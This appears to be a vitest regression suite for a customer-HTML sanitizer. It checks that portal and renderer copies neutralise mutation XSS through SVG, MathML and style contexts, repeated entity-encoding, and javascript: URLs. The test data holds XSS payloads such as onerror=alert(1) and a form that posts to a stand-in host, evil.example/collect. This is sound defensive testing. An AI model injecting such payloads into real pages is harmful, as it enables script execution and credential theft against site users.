// Security regressions for the customer-HTML sanitizer (finding K1).
//
// Both copies — the portal's save-time sanitizer and the static renderer's
// render-time sanitizer — must produce markup that a spec-compliant HTML
// parser (parse5, the same tree construction as browsers) reads without any
// executable element or event-handler attribute, however many times the
// content is sanitized and however deeply the payload is entity-encoded.
import { describe, it, expect } from 'vitest';
import { parseFragment, type DefaultTreeAdapterMap } from 'parse5';
import { sanitizeBody as portalSanitize } from '../../lib/sanitize';
import { sanitizeBody as rendererSanitize } from '../../../../site-template/src/lib/sanitize';

type Node = DefaultTreeAdapterMap['node'];

const sanitizers = [
  ['portal', portalSanitize],
  ['static renderer', rendererSanitize],
] as const;

function encode(html: string, folds: number): string {
  let out = html;
  for (let i = 0; i < folds; i++) out = out.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  return out;
}

/** Elements and attributes a browser would build from `html`, as `tag[attr]` strings. */
function liveMarkup(html: string): string[] {
  const found: string[] = [];
  const walk = (node: Node) => {
    if ('tagName' in node) {
      for (const attr of node.attrs) {
        if (/^on/i.test(attr.name) || /^\s*javascript:/i.test(attr.value)) found.push(`${node.tagName}[${attr.name}]`);
      }
      if (['script', 'object', 'embed'].includes(node.tagName)) found.push(node.tagName);
    }
    const children = 'childNodes' in node ? node.childNodes : [];
    for (const child of children) walk(child as Node);
    if ('content' in node && node.content) walk(node.content as Node);
  };
  walk(parseFragment(html) as Node);
  return found;
}

const payload = '<img src=x onerror=alert(1)>';
const contexts = [
  (inner: string) => `<svg><style>${inner}</style></svg>`,
  (inner: string) => `<math><style>${inner}</style></math>`,
  (inner: string) => `<svg><p><style>${inner}</style></p></svg>`,
  (inner: string) => `<svg><foreignObject><style>${inner}</style></foreignObject></svg>`,
  (inner: string) => `<svg><mi><style>${inner}</style></mi></svg>`,
  (inner: string) => `<svg><desc><style>${inner}</style></desc></svg>`,
  (inner: string) => `<svg><g><style>${inner}</style></g></svg>`,
  (inner: string) => `<style>${inner}</style>`,
];

describe.each(sanitizers)('%s sanitizeBody — raw-text mutation XSS', (_name, sanitizeBody) => {
  it('does not turn an entity-encoded payload inside <svg><style> into markup', () => {
    const out = sanitizeBody('<svg><style>&lt;img src=x onerror=alert(1)&gt;</style></svg>');
    expect(out).toBe('<svg><style>&lt;img src=x onerror=alert(1)&gt;</style></svg>');
    expect(liveMarkup(out)).toEqual([]);
  });

  for (const [index, wrap] of contexts.entries()) {
    for (const inner of [payload, `</style>${payload}`]) {
      for (const folds of [0, 1, 2, 3]) {
        it(`context ${index}, ${folds}-fold encoded ${inner.startsWith('</') ? 'close-tag ' : ''}payload stays inert over repeated passes`, () => {
          let out = wrap(encode(inner, folds));
          for (let pass = 1; pass <= 4; pass++) {
            out = sanitizeBody(out);
            expect(liveMarkup(out), `pass ${pass}: ${out}`).toEqual([]);
            expect(out).not.toMatch(/tr-style-/);
          }
        });
      }
    }
  }

  it('escapes markup characters in SVG <style> text, which browsers decode back to the same CSS', () => {
    const svg = '<svg viewBox="0 0 10 10"><style>.a > .b{fill:red}</style><g class="a"><rect class="b" width="10" height="10"></rect></g></svg>';
    const out = sanitizeBody(svg);
    expect(out).toBe(svg.replace('.a > .b', '.a &gt; .b'));
    expect(sanitizeBody(out)).toBe(out);
  });

  it('keeps page-level <style> CSS byte-for-byte, including characters that would be escaped elsewhere', () => {
    const css = '<style>.a > .b{color:red}.c{&:hover{color:blue}}.d{background:url("data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\'></svg>")}.e::after{content:"&amp; <"}</style>';
    expect(sanitizeBody(css)).toBe(css);
    expect(sanitizeBody(sanitizeBody(css))).toBe(css);
  });

  it('cannot be steered by content that imitates the internal style placeholder', () => {
    const out = sanitizeBody('<style></tr-style-0><img src=x onerror=alert(1)><tr-style-0></style>');
    expect(liveMarkup(out)).toEqual([]);
  });
});

describe.each(sanitizers)('%s sanitizeBody — URL attributes and credential fields', (_name, sanitizeBody) => {
  it('drops non-http(s) form actions and keeps ordinary ones', () => {
    expect(sanitizeBody('<form action="javascript:alert(1)"><button>x</button></form>')).toBe('<form><button>x</button></form>');
    expect(sanitizeBody('<form action="data:text/html,x"></form>')).toBe('<form></form>');
    expect(sanitizeBody('<form action="/contact" method="post"></form>')).toBe('<form action="/contact" method="post"></form>');
  });

  it('never keeps formaction or a scripted SVG <use> reference', () => {
    expect(sanitizeBody('<button formaction="javascript:alert(1)">x</button>')).toBe('<button>x</button>');
    expect(sanitizeBody('<svg><use xlink:href="javascript:alert(1)"></use><use href="data:image/svg+xml,x"></use></svg>'))
      .toBe('<svg><use></use><use></use></svg>');
    expect(sanitizeBody('<svg><use xlink:href="#icon"></use></svg>')).toBe('<svg><use xlink:href="#icon"></use></svg>');
  });

  it('removes password inputs from published HTML', () => {
    expect(sanitizeBody('<form action="https://evil.example/collect"><input type="password" name="p"><input type="PASSWORD " name="q"><input type="text" name="u"></form>'))
      .toBe('<form action="https://evil.example/collect"><input type="text" name="u" /></form>');
  });
});

describe('sanitizer copies', () => {
  it('produce identical output', () => {
    const corpus = [
      '<svg><style>&lt;img src=x onerror=alert(1)&gt;</style></svg>',
      '<style>.a > .b{color:red}</style><p class="a">x</p>',
      '<svg viewBox="0 0 24 24"><style>.s{stroke:#000}</style><path class="s" d="M0 0L24 24"></path></svg>',
      '<form action="/x"><input type="password"><input type="email" name="e"></form>',
    ];
    for (const html of corpus) expect(rendererSanitize(html)).toBe(portalSanitize(html));
  });
});
